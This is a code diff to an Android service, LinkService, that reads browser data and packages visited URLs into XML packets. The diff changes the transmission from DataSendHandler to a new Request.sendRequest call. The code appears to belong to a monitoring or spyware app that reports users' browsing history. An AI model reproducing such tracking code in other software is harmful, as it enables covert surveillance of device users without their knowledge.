@@ -18,8 +18,8 @@ import android.preference.PreferenceManager;
 import android.provider.Browser;
 import android.util.Log;
 
-import com.inet.android.bs.DataSendHandler;
 import com.inet.android.bs.FileLog;
+import com.inet.android.bs.Request;
 import com.inet.android.bs.WorkTimeDefiner;
 
 public class LinkService extends Service {
@@ -30,7 +30,7 @@ public class LinkService extends Service {
 	final String SAVED_TIME = "saved_time";
 	private Context context;
 	private SharedPreferences sp;
-
+	Request req;
 	public void onCreate() {
 		super.onCreate();
 		startService(new Intent(this, LinkService.class));
@@ -160,9 +160,9 @@ public class LinkService extends Service {
 							+ "Интернет-браузер</app><url>" + url
 							+ "</url><ntime>" + "30"
 				+ "</ntime></packet>";
+					req = new Request(context);
+					req.sendRequest(sendStr);
 
-					DataSendHandler dSH = new DataSendHandler(context);
-					dSH.send(3, sendStr);
 					Editor ed = sPref.edit();
 					ed.putString(SAVED_TIME, title);
 					ed.commit();
